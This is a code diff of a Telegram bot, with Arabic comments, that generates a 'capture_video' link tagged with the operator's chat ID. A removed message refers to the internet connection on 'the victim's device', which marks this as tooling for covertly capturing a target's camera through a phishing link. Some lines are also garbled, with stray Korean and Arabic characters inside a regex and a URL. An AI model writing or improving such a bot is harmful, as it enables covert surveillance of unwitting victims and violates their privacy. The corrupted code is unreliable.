@@ -1683,36 +1683,27 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
 
 
 
-bot.on('callback_query', (callbackQuery) => {  
-    const chatId = callbackQuery.message.chat.id;  
+const fetchLinks = require('./fetchLinks.js');
+
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
-    // استخراج الرابط الصحيح من linkur
-    // مثلاً linkur يحتوي عدة روابط ونريد الذي ينتهي بـ "ca"
-    let extracted = null;
-    const links = linkur.match(/https?:\/\/[^\s]+/g); // استخراج كل الروابط
+    if (data === 'capture_video') {
 
-    if (links) {
-        for (const l of links) {
-            if (l.endsWith('/ca') || l.endsWith('/ca/')) {
-                extracted = l;
-                break;
-            }
+        // جلب الروابط من الصفحة
+        const linkur = await fetchLinks();
+
+        // استخراج رابط ينتهي بـ "ca"
+        const caLink = linkur.find(link => link.endsWith("ca")) || null;
+
+        if (!caLink) {
+            return bot.sendMessage(chatId, "لا يوجد رابط ينتهي بـ ca في الصفحة.");
         }
-    }
 
-    // إذا لم يجد رابط ينتهي بـ /ca استخدم الرابط الأصلي كاحتياط
-    if (!extracted) {
-        extracted = "httاللصليps://lucky-bubblegum-d77796.netlify.app/ca";
-    }
+        const message = `تم إنشاء الرابط بنجاح:\n${caLink}/?chatId=${chatId}`;
 
-    if (data === 'capture_video') {  
-        const message =
-            `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه لازم يكون النت قوي في جهاز الضحيه\n: ${extracted}/?chatId=${chatId}`;
-
-        if (message.trim() !== '') {  
-            bot.sendMessage(chatId, message);  
-        }
+        bot.sendMessage(chatId, message);
     }
 });
 
